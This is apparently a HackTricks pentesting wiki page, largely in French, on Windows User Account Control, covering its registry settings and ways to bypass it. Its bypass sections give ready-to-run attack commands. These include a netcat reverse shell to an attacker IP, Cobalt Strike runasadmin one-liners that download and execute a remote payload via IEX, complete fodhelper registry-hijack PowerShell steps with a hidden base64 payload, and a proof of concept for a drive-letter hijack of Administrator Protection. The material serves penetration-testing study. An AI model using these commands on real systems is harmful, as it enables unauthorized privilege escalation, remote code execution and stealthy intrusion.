# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une **invite de consentement pour les activités nécessitant une élévation**. Les applications ont différents `integrity` levels, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Quand UAC est activé, les applications et tâches s'exécutent toujours **dans le contexte de sécurité d'un compte non administrateur** à moins qu'un administrateur n'autorise explicitement ces applications/tâches à disposer d'un accès de niveau administrateur pour s'exécuter. C'est une fonctionnalité de confort qui protège les administrateurs contre des modifications involontaires mais elle n'est pas considérée comme une frontière de sécurité.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quand UAC est en place, un utilisateur administrateur reçoit 2 tokens : un token d'utilisateur standard, pour effectuer des actions régulières en niveau normal, et un autre avec les privilèges admin.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de UAC et couvre le processus de logon, l'expérience utilisateur et l'architecture de UAC. Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le comportement de UAC au niveau local (avec secpol.msc), ou le configurer et le déployer via des Group Policy Objects (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont expliqués en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il y a 10 paramètres de Group Policy qui peuvent être définis pour UAC. Le tableau suivant fournit des détails supplémentaires :

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Many auto-elevate processes expose **functionality via COM objects or RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.

Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.

Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like system32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.

Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).

### Check UAC

Pour confirmer si UAC est activé, faites :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si c'est **`1`** alors UAC est **activé**, si c'est **`0`** ou s'il n'existe pas, alors UAC est **inactif**.

Ensuite, vérifiez **quel niveau** est configuré :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** alors, UAC ne demandera rien (comme **désactivé**)
- If **`1`** l'admin est **invité à entrer le nom d'utilisateur et le mot de passe** pour exécuter le binary avec des droits élevés (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC demandera toujours une confirmation à l'administrateur lorsqu'il tente d'exécuter quelque chose avec des privilèges élevés (on Secure Desktop)
- If **`3`** comme `1` mais pas nécessaire sur Secure Desktop
- If **`4`** comme `2` mais pas nécessaire sur Secure Desktop
- if **`5`**(**default**) il demandera à l'administrateur de confirmer l'exécution de binaries non Windows avec des privilèges élevés

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Résumé

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

Vous pouvez aussi vérifier les groupes de votre utilisateur et obtenir le niveau d'intégrité :
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Notez que si vous avez un accès graphique à la victime, UAC bypass est très simple : vous pouvez simplement cliquer sur "Yes" lorsque l'invite UAC apparaît

Le UAC bypass est nécessaire dans la situation suivante : **le UAC est activé, votre processus s'exécute dans un contexte d'intégrité moyen, et votre utilisateur appartient au groupe administrators**.

Il est important de mentionner qu'il est **beaucoup plus difficile de bypasser le UAC s'il est au niveau de sécurité le plus élevé (Always) que s'il est à n'importe lequel des autres niveaux (Default).**

### UAC disabled

Si UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**) vous pouvez **execute a reverse shell with admin privileges** (niveau d'intégrité élevé) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** basique UAC "bypass" (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur qui fait partie du Administrators group, vous pouvez **mount the C$** partagé via SMB (file system) local sur un nouveau disque et vous aurez **access to everything inside the file system** (même le Administrator home folder).

> [!WARNING]
> **Il semble que cette astuce ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Les techniques Cobalt Strike ne fonctionneront que si UAC n'est pas réglé à son niveau de sécurité maximal.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** ont également plusieurs modules pour **bypass** le **UAC**.

### KRBUACBypass

Documentation et outil sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) qui est une **compilation** de plusieurs UAC bypass exploits. Notez que vous devrez **compile UACME using visual studio or msbuild**. La compilation créera plusieurs executables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous devez utiliser.**\
Vous devez **faire attention** car certains bypasses vont **provoquer l'ouverture d'autres programmes** qui vont **alerter** l'**utilisateur** qu'il se passe quelque chose.

UACME a la **build version à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [this](https://en.wikipedia.org/wiki/Windows_10_version_history) vous obtenez la release Windows `1607` à partir des versions de build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Le binaire de confiance `fodhelper.exe` est auto-élevé sur les versions modernes de Windows. Lors de son lancement, il interroge le chemin de registre par utilisateur ci‑dessous sans valider le verbe `DelegateExecute`. Y placer une commande permet à un processus Medium Integrity (l'utilisateur est dans Administrators) de lancer un processus High Integrity sans invite UAC.

Chemin de registre interrogé par fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Étapes PowerShell (définissez votre payload, puis trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Fonctionne lorsque l'utilisateur courant est membre du groupe Administrators et que le niveau UAC est default/lenient (pas Always Notify avec des restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour lancer un PowerShell 64-bit depuis un processus 32-bit sur un Windows 64-bit.
- Le payload peut être n'importe quelle commande (PowerShell, cmd, ou un chemin EXE). Évitez les UIs demandant une interaction pour rester discret.

#### More UAC bypass

**Toutes** les techniques utilisées ici pour contourner UAC **exigent** une **session interactive complète** avec la victime (une simple shell nc.exe n'est pas suffisante).

Vous pouvez l'obtenir en utilisant une session **meterpreter**. Migrez vers un **process** dont la valeur **Session** est égale à **1** :

![](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### UAC Bypass with GUI

Si vous avez accès à une **GUI** vous pouvez simplement accepter l'invite UAC lorsqu'elle apparaît, vous n'avez pas forcément besoin d'un contournement. Ainsi, obtenir l'accès à une GUI vous permettra de contourner l'UAC.

De plus, si vous obtenez une session GUI qu'une personne utilisait (potentiellement via RDP), il y a **des outils qui tourneront en tant qu'administrator** depuis lesquels vous pourriez **lancer** un **cmd** par exemple **en tant qu'admin** directement sans être redemandé par UAC, comme [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela peut être un peu plus **discret**.

### Noisy brute-force UAC bypass

Si le bruit ne vous dérange pas vous pouvez toujours **lancer quelque chose comme** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) qui **demande l'élévation des privilèges jusqu'à ce que l'utilisateur accepte**.

### Your own bypass - Basic UAC bypass methodology

Si vous regardez **UACME** vous remarquerez que **la plupart des contournements UAC abusent d'une vulnérabilité de DLL Hijacking** (principalement en écrivant le dll malveillant dans _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trouvez un binaire qui **autoelevate** (vérifiez que lorsqu'il est exécuté il tourne en high integrity level).
2. Avec procmon trouvez les événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous aurez probablement besoin de **copier** le DLL dans certains **chemins protégés** (comme C:\Windows\System32) où vous n'avez pas les permissions en écriture. Vous pouvez contourner cela en utilisant :
   1. **wusa.exe** : Windows 7,8 et 8.1. Permet d'extraire le contenu d'un fichier CAB dans des chemins protégés (parce que cet outil s'exécute en high integrity level).
   2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL dans le chemin protégé et exécutez le binaire vulnérable et autoelevated.

### Another UAC bypass technique

Consiste à observer si un binaire **autoElevated** tente de **lire** depuis le **registry** le **nom/chemin** d'un **binaire** ou d'une **commande** à **exécuter** (c'est plus intéressant si le binaire recherche cette information dans **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” utilise des shadow-admin tokens avec des maps `\Sessions\0\DosDevices/<LUID>` par session. Le répertoire est créé paresseusement par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l'attaquant usurpe le shadow-admin token seulement au niveau **SecurityIdentification**, le répertoire est créé avec l'attaquant comme **owner** (hérite de `CREATOR OWNER`), permettant des liens de lettre de lecteur qui priment sur `\GLOBAL??`.

**Steps:**

1. Depuis une session à faible privilège, appelez `RAiProcessRunOnce` pour lancer un `runonce.exe` shadow-admin sans invite.
2. Dupliquez son primary token en un token d'**identification** et usurpez-le tout en ouvrant `\??` pour forcer la création de `\Sessions\0\DosDevices/<LUID>` sous la propriété de l'attaquant.
3. Créez un symlink `C:` là-bas pointant vers un stockage contrôlé par l'attaquant ; les accès au système de fichiers dans cette session résolvent `C:` vers le chemin de l'attaquant, permettant le hijack de DLL/fichiers sans invite.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Références
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Comment fonctionne User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
